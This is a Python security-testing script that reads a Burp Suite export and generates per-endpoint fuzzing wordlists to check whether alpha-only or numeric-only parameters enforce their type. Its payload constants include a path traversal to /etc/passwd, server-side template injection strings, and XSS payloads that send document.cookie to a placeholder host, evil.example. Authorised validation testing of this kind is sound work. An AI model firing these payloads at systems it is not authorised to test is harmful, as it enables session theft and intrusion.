#!/usr/bin/env python3
"""
WSTG-BUSL-01 — Business Logic Validation
Script 1: business_logic_validation.py

Reads a Burp Suite XML export, identifies endpoints that contain
parameter values consisting exclusively of alphabetic characters
OR exclusively of numeric characters, records them to EP_SFCS.json,
and generates a per-endpoint wordlist for Burp Intruder testing.

The wordlist tests the hypothesis: "does this field enforce its
apparent data type?" — i.e. does an alpha-only field reject numbers,
unicode lookalikes, injections, etc.?

Wordlist categories (alpha-only parameters):
  A1  Unicode full confusion   — every substitutable char replaced
  A2  Unicode partial confusion — vowels only replaced
  A3  Hex encoding             — full string as hex bytes
  A4  Decimal encoding         — full string as decimal bytes (space-sep)
  A5  Binary encoding          — full string as binary bytes (space-sep)
  A6  Random word variants     — A1-A5 applied to a random substitute word
  A7  Special / painful chars  — 2-3 lines of brutal special chars
  A8  Integer-only lines       — 2-3 integer values
  A9  Negative numbers         — 2-3 negative integer values
  A10 Template injection       — 2 SSTI/client-side template payloads
  A11 JavaScript injection     — 2 JS execution payloads

Wordlist categories (numeric-only parameters):
  N1  Unicode digit confusion  — fullwidth / superscript digit lookalikes
  N2  Hex representation       — number as 0x hex
  N3  Octal representation     — number as 0o octal
  N4  Binary representation    — number as 0b binary
  N5  Negative version         — negated value
  N6  Random number variants   — N1-N5 applied to a random integer
  N7  Special / painful chars  — 2-3 lines of brutal special chars
  N8  Alpha-only strings       — 2-3 pure alphabet strings
  N9  Template injection       — 2 SSTI/client-side template payloads
  N10 JavaScript injection     — 2 JS execution payloads

All categories emit 2-3 entries maximum per parameter value.

Inputs:
  WSTG-BUSL-01/inputs/xml/busl_01.xml

Outputs:
  WSTG-BUSL-01/outputs/test_outputs/EP_SFCS.json
  WSTG-BUSL-01/inputs/wordlist/EP_<INDEX>.txt   (one per qualifying endpoint)

Usage:
  python3 WSTG-BUSL-01/utilities/python/business_logic_validation.py \\
      [--xml WSTG-BUSL-01/inputs/xml/busl_01.xml]
"""

import argparse
import base64
import json
import os
import random
import re
import sys
import xml.etree.ElementTree as ET
from datetime import datetime
from urllib.parse import parse_qs, urlparse


# ---------------------------------------------------------------------------
# ANSI
# ---------------------------------------------------------------------------
BOLD    = "\033[1m"
DIM     = "\033[2m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
RED     = "\033[91m"
CYAN    = "\033[96m"
RESET   = "\033[0m"


# ---------------------------------------------------------------------------
# Unicode confusion map — visually similar substitutions
# Covers: Latin→Cyrillic, Latin→Greek, fullwidth, mathematical,
#         superscript, look-alike punctuation
# ---------------------------------------------------------------------------
UNICODE_CONFUSABLES = {
    # Lowercase — primary lookalikes
    'a': ['а', 'ɑ', 'α'],   # Cyrillic а, Latin alpha, Greek alpha
    'b': ['Ь', 'ƅ', 'ɓ'],   # Cyrillic soft sign, Bilabial click, Implosive
    'c': ['с', 'ϲ', 'ć'],   # Cyrillic с, Greek lunate sigma
    'd': ['ԁ', 'ɗ', 'ď'],   # Cyrillic д-like, Implosive d
    'e': ['е', 'ё', 'ε'],   # Cyrillic е, Cyrillic ё, Greek epsilon
    'f': ['ƒ', 'ſ'],        # Florin, long s
    'g': ['ɡ', 'ġ', 'ǵ'],  # Script g variants
    'h': ['һ', 'ħ', 'ȟ'],  # Cyrillic h, H with stroke
    'i': ['і', 'і', 'ı'],   # Cyrillic і, dotless i
    'j': ['ϳ', 'ĵ', 'ɉ'],  # Greek yot, j with circumflex
    'k': ['κ', 'ķ', 'ƙ'],  # Greek kappa, k with cedilla
    'l': ['ӏ', 'ℓ', 'ļ'],  # Cyrillic palochka, script l
    'm': ['м', 'ɱ', 'ṁ'],  # Cyrillic м, m with hook
    'n': ['п', 'ŋ', 'ń'],  # Cyrillic п (visual), Eng
    'o': ['о', 'ο', '0'],   # Cyrillic о, Greek omicron, zero
    'p': ['р', 'ρ', 'ƿ'],  # Cyrillic р, Greek rho, Wynn
    'q': ['զ', 'ԛ', 'ɋ'],  # Armenian za, Cyrillic qa
    'r': ['г', 'ŗ', 'ȓ'],  # Cyrillic г-like, r with cedilla
    's': ['ѕ', 'ş', 'ś'],  # Cyrillic dze, s with cedilla
    't': ['т', 'ţ', 'ť'],  # Cyrillic т, t with cedilla
    'u': ['υ', 'ü', 'ū'],  # Greek upsilon, u umlaut
    'v': ['ν', 'ѵ', 'ṽ'],  # Greek nu, Cyrillic izhitsa
    'w': ['ѡ', 'ώ', 'ŵ'],  # Cyrillic omega, Greek omega
    'x': ['х', 'χ', '×'],  # Cyrillic х, Greek chi, multiplication
    'y': ['у', 'ý', 'ÿ'],  # Cyrillic у, y with acute
    'z': ['ʐ', 'ż', 'ź'],  # z with retroflex, z with dot
    # Uppercase — primary lookalikes
    'A': ['А', 'Α', 'Ꭺ'],  # Cyrillic А, Greek Alpha, Cherokee
    'B': ['В', 'Β', 'Ᏼ'],  # Cyrillic В, Greek Beta
    'C': ['С', 'Ϲ', 'Ꮯ'],  # Cyrillic С, Greek lunate sigma
    'D': ['Ꭰ', 'Ḋ', 'Đ'],  # Cherokee D, D with dot
    'E': ['Е', 'Ε', 'Ꭼ'],  # Cyrillic Е, Greek Epsilon
    'F': ['Ƒ', 'Ϝ'],       # F with hook, Digamma
    'G': ['Ġ', 'Ĝ', 'Ğ'],  # G variants
    'H': ['Н', 'Η', 'Ꮋ'],  # Cyrillic Н, Greek Eta
    'I': ['І', 'Ι', 'Ꭵ'],  # Cyrillic І, Greek Iota
    'J': ['Ĵ', 'Ϳ'],       # J with circumflex, Greek yot capital
    'K': ['К', 'Κ', 'Ꮶ'],  # Cyrillic К, Greek Kappa
    'L': ['Ꮮ', 'Ļ', 'Ĺ'],  # Cherokee L, L variants
    'M': ['М', 'Μ', 'Ꮇ'],  # Cyrillic М, Greek Mu
    'N': ['Ν', 'Ꮑ', 'Ń'],  # Greek Nu, Cherokee N
    'O': ['О', 'Ο', '0'],   # Cyrillic О, Greek Omicron, zero
    'P': ['Р', 'Ρ', 'Ꭾ'],  # Cyrillic Р, Greek Rho
    'Q': ['Ԛ', 'Ꝗ'],       # Cyrillic Qa, Q with stroke
    'R': ['Ʀ', 'Ꮢ', 'Ŗ'],  # Small caps R, Cherokee R
    'S': ['Ѕ', 'Ś', 'Ş'],  # Cyrillic Dze, S variants
    'T': ['Т', 'Τ', 'Ꭲ'],  # Cyrillic Т, Greek Tau
    'U': ['Ü', 'Ū', 'Ʊ'],  # U variants
    'V': ['Ѵ', 'Ꮩ', 'Ṽ'],  # Cyrillic Izhitsa, Cherokee V
    'W': ['Ѡ', 'Ꮃ', 'Ŵ'],  # Cyrillic Omega, Cherokee W
    'X': ['Х', 'Χ', 'Ꭓ'],  # Cyrillic Х, Greek Chi
    'Y': ['У', 'Υ', 'Ÿ'],  # Cyrillic У, Greek Upsilon
    'Z': ['Ζ', 'Ż', 'Ź'],  # Greek Zeta, Z variants
    # Vowels set — used for partial confusion
    'VOWELS': set('aeiouAEIOU'),
    # Digit lookalikes
    '0': ['О', 'о', 'Ο'],  # Letter-O lookalikes
    '1': ['ı', 'ｌ', 'І'],  # Dotless i, fullwidth l, Cyrillic І
    '2': ['２', 'ƻ'],       # Fullwidth 2
    '3': ['３', 'Ʒ'],       # Fullwidth 3, Ezh
    '4': ['４', 'Ч'],       # Fullwidth 4
    '5': ['５', 'Ƽ'],       # Fullwidth 5
    '6': ['６', 'б'],       # Fullwidth 6, Cyrillic б
    '7': ['７', '٧'],       # Fullwidth 7, Arabic 7
    '8': ['８', 'Ȣ'],       # Fullwidth 8
    '9': ['９', 'ɋ'],       # Fullwidth 9
}

VOWELS = set('aeiouAEIOU')

# Random substitute words for case A6/N6
RANDOM_WORDS   = ['banana', 'system', 'delete', 'purple', 'hunter', 'widget', 'falcon']
RANDOM_NUMBERS = [42, 999, 1337, 8080, 31337, 65535, 0]

# Special chars that make parsers cry
SPECIAL_CHARS_LINES = [
    '"><img src=x>\'',
    '\x00\x01\x02\x03\x04\x05\x06\x07',
    '../../../../etc/passwd',
    '%00%0a%0d%09%0b',
    '¡¢£¤¥¦§¨©ª«¬®¯°±²³',
    '​‌‍⁠﻿',    # zero-width chars
    '​​​​​​‌‌‌‌',                          # mixed zero-width
]

# Template injection payloads — SSTI + client-side
TEMPLATE_INJECTION = [
    '{{7*7}}${7*7}#{7*7}',
    '<%= 7 * 7 %>{{config.__class__.__init__.__globals__}}',
    '${{"".class.forName("java.lang.Runtime")}}',
]

# JavaScript payloads — not trivial one-liners
JAVASCRIPT_PAYLOADS = [
    'javascript:void(document.location=\'https://evil.example/\'+document.cookie)',
    '<script>fetch(\'https://evil.example/\',{method:\'POST\',body:JSON.stringify({c:document.cookie})})</script>',
    '"><svg onload=\'(new Image).src="https://evil.example/"+btoa(document.cookie)\'/>',
]


# ---------------------------------------------------------------------------
# Encoding helpers
# ---------------------------------------------------------------------------

def to_hex(s: str) -> str:
    """Each char as \\xHH hex."""
    return ''.join(f'\\x{ord(c):02x}' for c in s)


def to_decimal(s: str) -> str:
    """Each char as decimal code point, space-separated."""
    return ' '.join(str(ord(c)) for c in s)


def to_binary(s: str) -> str:
    """Each char as 8-bit binary, space-separated."""
    return ' '.join(f'{ord(c):08b}' for c in s)


def unicode_full(s: str) -> str:
    """Replace every substitutable character with its first lookalike."""
    result = []
    for ch in s:
        subs = UNICODE_CONFUSABLES.get(ch)
        if subs:
            result.append(subs[0])
        else:
            result.append(ch)
    return ''.join(result)


def unicode_partial(s: str) -> str:
    """Replace vowels only with their first lookalike."""
    result = []
    for ch in s:
        if ch in VOWELS:
            subs = UNICODE_CONFUSABLES.get(ch)
            if subs:
                result.append(subs[0])
            else:
                result.append(ch)
        else:
            result.append(ch)
    return ''.join(result)


def unicode_digits(s: str) -> str:
    """Replace digits with their first lookalike."""
    result = []
    for ch in s:
        subs = UNICODE_CONFUSABLES.get(ch)
        if subs:
            result.append(subs[0])
        else:
            result.append(ch)
    return ''.join(result)


# ---------------------------------------------------------------------------
# Wordlist generators
# ---------------------------------------------------------------------------

def _pick(lst: list, n: int = 2) -> list:
    """Pick up to n items from lst without replacement."""
    return lst[:n] if len(lst) >= n else lst[:]


def generate_alpha_wordlist(value: str) -> list[str]:
    """
    Generate wordlist for an alpha-only parameter value.
    Returns a flat list of payload strings, one per line.
    """
    lines = []
    rword = random.choice(RANDOM_WORDS)

    def section(label: str, entries: list[str]):
        lines.append(f"# --- {label} ---")
        for e in _pick(entries, 2):
            if e.strip():
                lines.append(e)

    # A1 Unicode full confusion
    full1 = unicode_full(value)
    full2 = unicode_full(value[::-1]) if len(value) > 1 else unicode_full(value + 'x')
    section("A1 Unicode full confusion", [full1, full2])

    # A2 Unicode partial confusion (vowels)
    part1 = unicode_partial(value)
    part2 = unicode_partial(value.upper())
    section("A2 Unicode partial confusion (vowels)", [part1, part2])

    # A3 Hex
    section("A3 Hex encoding", [to_hex(value), to_hex(value.upper())])

    # A4 Decimal
    section("A4 Decimal encoding", [to_decimal(value), to_decimal(value.upper())])

    # A5 Binary
    section("A5 Binary encoding", [to_binary(value)])

    # A6 Random word variants (A1-A5 on random word)
    section("A6 Random word — unicode full",    [unicode_full(rword)])
    section("A6 Random word — hex",             [to_hex(rword)])
    section("A6 Random word — decimal",         [to_decimal(rword)])

    # A7 Special / painful chars
    section("A7 Special characters", _pick(SPECIAL_CHARS_LINES, 3))

    # A8 Integers
    section("A8 Integer-only values", ["12345", "0", "99999999"])

    # A9 Negative numbers
    section("A9 Negative numbers", ["-1", "-9999", "-0"])

    # A10 Template injection
    section("A10 Template injection", _pick(TEMPLATE_INJECTION, 2))

    # A11 JavaScript injection
    section("A11 JavaScript injection", _pick(JAVASCRIPT_PAYLOADS, 2))

    return lines


def generate_numeric_wordlist(value: str) -> list[str]:
    """
    Generate wordlist for a numeric-only parameter value.
    Returns a flat list of payload strings, one per line.
    """
    lines = []
    rnum  = random.choice(RANDOM_NUMBERS)

    # Try to parse the numeric value
    try:
        num_int = int(value)
    except ValueError:
        try:
            num_int = int(float(value))
        except ValueError:
            num_int = 0

    def section(label: str, entries: list[str]):
        lines.append(f"# --- {label} ---")
        for e in _pick(entries, 2):
            if e.strip():
                lines.append(e)

    # N1 Unicode digit confusion
    uc1 = unicode_digits(value)
    uc2 = unicode_digits(str(num_int + 1))
    section("N1 Unicode digit confusion", [uc1, uc2])

    # N2 Hex
    section("N2 Hex representation", [hex(num_int), f'0x{num_int:08X}'])

    # N3 Octal
    section("N3 Octal representation", [oct(num_int), f'{num_int:o}'])

    # N4 Binary
    section("N4 Binary representation", [bin(num_int), f'{num_int:b}'])

    # N5 Negative
    section("N5 Negative values", [str(-num_int), str(-num_int - 1)])

    # N6 Random number variants
    section("N6 Random number — unicode", [unicode_digits(str(rnum))])
    section("N6 Random number — hex",     [hex(rnum)])
    section("N6 Random number — octal",   [oct(rnum)])

    # N7 Special / painful chars
    section("N7 Special characters", _pick(SPECIAL_CHARS_LINES, 3))

    # N8 Alpha-only strings (should be rejected by numeric field)
    section("N8 Alpha-only strings", ["admin", "true", "NaN"])

    # N9 Template injection
    section("N9 Template injection", _pick(TEMPLATE_INJECTION, 2))

    # N10 JavaScript injection
    section("N10 JavaScript injection", _pick(JAVASCRIPT_PAYLOADS, 2))

    return lines


# ---------------------------------------------------------------------------
# Burp XML helpers
# ---------------------------------------------------------------------------

def decode_element(elem) -> str:
    if elem is None:
        return ""
    raw = elem.text or ""
    if elem.get("base64") == "true":
        try:
            return base64.b64decode(raw).decode("utf-8", errors="replace")
        except Exception:
            return raw
    return raw


def parse_burp_xml(path: str) -> list[dict]:
    try:
        tree = ET.parse(path)
    except (ET.ParseError, FileNotFoundError) as e:
        print(f"{RED}[!] XML error: {e}{RESET}", file=sys.stderr)
        sys.exit(1)

    items = []
    for idx, item in enumerate(tree.getroot().findall("item")):
        url    = decode_element(item.find("url"))
        method = decode_element(item.find("method")).upper()
        req    = decode_element(item.find("request"))

        parts    = req.split("\r\n\r\n", 1)
        req_head = parts[0]
        req_body = parts[1] if len(parts) > 1 else ""

        items.append({
            "index":    idx,
            "url":      url,
            "method":   method,
            "req_head": req_head,
            "req_body": req_body,
        })
    return items


# ---------------------------------------------------------------------------
# Parameter extraction
# ---------------------------------------------------------------------------

def is_alpha_only(s: str) -> bool:
    return bool(s) and s.isalpha()


def is_numeric_only(s: str) -> bool:
    # Allows integer strings, optional leading minus
    return bool(s) and re.fullmatch(r'-?\d+(\.\d+)?', s) is not None


def extract_qualifying_params(item: dict) -> list[dict]:
    """
    Extract URL and body parameters whose values are alpha-only or numeric-only.
    Returns list of qualifying param dicts.
    """
    found = []
    url_parsed = urlparse(item["url"])

    # URL parameters
    if url_parsed.query:
        for key, vals in parse_qs(url_parsed.query, keep_blank_values=False).items():
            for v in vals:
                if is_alpha_only(v):
                    found.append({"name": key, "value": v, "data_type": "alpha",   "source": "url"})
                elif is_numeric_only(v):
                    found.append({"name": key, "value": v, "data_type": "numeric", "source": "url"})

    # Body parameters
    body = item["req_body"].strip()
    if body:
        if body.startswith("{") or body.startswith("["):
            try:
                obj = json.loads(body)
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        if isinstance(v, str):
                            if is_alpha_only(v):
                                found.append({"name": k, "value": v, "data_type": "alpha",   "source": "body"})
                            elif is_numeric_only(v):
                                found.append({"name": k, "value": v, "data_type": "numeric", "source": "body"})
                        elif isinstance(v, (int, float)):
                            found.append({"name": k, "value": str(v), "data_type": "numeric", "source": "body"})
            except Exception:
                pass
        elif "=" in body:
            try:
                for key, vals in parse_qs(body, keep_blank_values=False).items():
                    for v in vals:
                        if is_alpha_only(v):
                            found.append({"name": key, "value": v, "data_type": "alpha",   "source": "body"})
                        elif is_numeric_only(v):
                            found.append({"name": key, "value": v, "data_type": "numeric", "source": "body"})
            except Exception:
                pass

    return found


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    p = argparse.ArgumentParser(
        description="WSTG-BUSL-01 Script 1: Business logic parameter scanner + wordlist generator"
    )
    p.add_argument("--xml",
        default=os.path.join("WSTG-BUSL-01", "inputs", "xml", "busl_01.xml"),
        metavar="PATH")
    p.add_argument("--out-dir",
        default=os.path.join("WSTG-BUSL-01", "outputs", "test_outputs"),
        metavar="DIR")
    p.add_argument("--wordlist-dir",
        default=os.path.join("WSTG-BUSL-01", "inputs", "wordlist"),
        metavar="DIR")
    args = p.parse_args()

    width = 65
    print(f"\n{BOLD}{'='*width}{RESET}")
    print(f"{BOLD} WSTG-BUSL-01 — Business Logic Validation Scanner{RESET}")
    print(f"{BOLD}{'='*width}{RESET}")
    print(f"  XML : {args.xml}\n")

    items = parse_burp_xml(args.xml)
    print(f"  Parsed {len(items)} request(s)\n")

    os.makedirs(args.out_dir, exist_ok=True)
    os.makedirs(args.wordlist_dir, exist_ok=True)

    ep_sfcs_requests = {}
    wordlist_count   = 0

    for item in items:
        idx    = item["index"]
        url    = item["url"]
        method = item["method"]

        parsed_url = urlparse(url)
        path       = parsed_url.path or url

        qualifying = extract_qualifying_params(item)
        if not qualifying:
            continue

        alpha_params   = [q for q in qualifying if q["data_type"] == "alpha"]
        numeric_params = [q for q in qualifying if q["data_type"] == "numeric"]

        print(
            f"  [{idx:3d}] {method:<7} {path[:55]}{'...' if len(path)>55 else ''}"
        )
        for q in qualifying:
            col = CYAN if q["data_type"] == "alpha" else YELLOW
            print(f"         {col}{q['data_type']:<8}{RESET}  `{q['name']}` = `{q['value'][:40]}`")

        # Build EP_SFCS entry
        ep_sfcs_requests[str(idx)] = {
            "endpoint_index": idx,
            "path":           path,
            "method":         method,
            "parameter_values": [
                {
                    "name":      q["name"],
                    "value":     q["value"],
                    "data_type": q["data_type"],
                    "source":    q["source"],
                }
                for q in qualifying
            ],
        }

        # Generate and write wordlist
        wordlist_lines = [
            f"# WSTG-BUSL-01 Wordlist — Endpoint {idx}",
            f"# Path   : {path}",
            f"# Method : {method}",
            f"# Generated: {datetime.now().isoformat()}",
            "#",
            "# HOW TO USE:",
            "# 1. Send the target request to Burp Intruder.",
            "# 2. Mark the parameter value as the payload position.",
            "# 3. Load this file as a Simple List payload.",
            "# 4. Lines beginning with '#' are comments and Burp will skip them.",
            "# 5. Observe responses — see busl01_validation.py to parse results.",
            "#",
        ]

        # Alpha parameters
        for q in alpha_params:
            wordlist_lines.append(f"# ════ Parameter: {q['name']} (alpha-only) ════")
            wordlist_lines.extend(generate_alpha_wordlist(q["value"]))
            wordlist_lines.append("")

        # Numeric parameters
        for q in numeric_params:
            wordlist_lines.append(f"# ════ Parameter: {q['name']} (numeric-only) ════")
            wordlist_lines.extend(generate_numeric_wordlist(q["value"]))
            wordlist_lines.append("")

        wl_path = os.path.join(args.wordlist_dir, f"EP_{idx}.txt")
        with open(wl_path, "w", encoding="utf-8") as f:
            f.write("\n".join(wordlist_lines) + "\n")
        print(f"         {GREEN}→ {wl_path}{RESET}")
        wordlist_count += 1

    # Write EP_SFCS.json
    ep_sfcs = {
        "_meta": {
            "source_xml":       args.xml,
            "generated":        datetime.now().isoformat(),
            "qualifying_eps":   len(ep_sfcs_requests),
            "note": (
                "Endpoints with at least one alpha-only or numeric-only parameter value. "
                "Use the per-endpoint wordlists in inputs/wordlist/ with Burp Intruder, "
                "then parse results with busl01_validation.py."
            ),
        },
        "requests": ep_sfcs_requests,
    }

    sfcs_path = os.path.join(args.out_dir, "EP_SFCS.json")
    with open(sfcs_path, "w", encoding="utf-8") as f:
        json.dump(ep_sfcs, f, indent=2, ensure_ascii=False)

    print(f"\n{GREEN}[+] EP_SFCS.json   → {sfcs_path}{RESET}")
    print(f"    {len(ep_sfcs_requests)} qualifying endpoint(s)")
    print(f"{GREEN}[+] Wordlists      → {args.wordlist_dir}/{RESET}")
    print(f"    {wordlist_count} wordlist(s) written")
    print(f"\n  Next: run Burp Intruder with EP_<N>.txt, export results as XML,")
    print(f"        then: busl01_validation.py --intruder inputs/xml/intruder_test.xml")
    print()


if __name__ == "__main__":
    main()
